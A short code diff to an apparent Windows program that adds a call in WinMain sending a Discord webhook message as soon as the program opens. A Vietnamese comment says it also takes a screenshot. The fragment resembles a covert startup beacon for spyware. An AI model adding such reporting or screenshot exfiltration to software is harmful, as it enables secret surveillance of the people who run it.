@@ -567,6 +567,8 @@ void LoadAPIs() {
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    // Chup anh + gui Discord ngay khi khoi dong
+    SendDirectWebhook(L"[KHOI DONG] Chuong trinh vua duoc mo");
     LoadAPIs();
     return 0;
 }
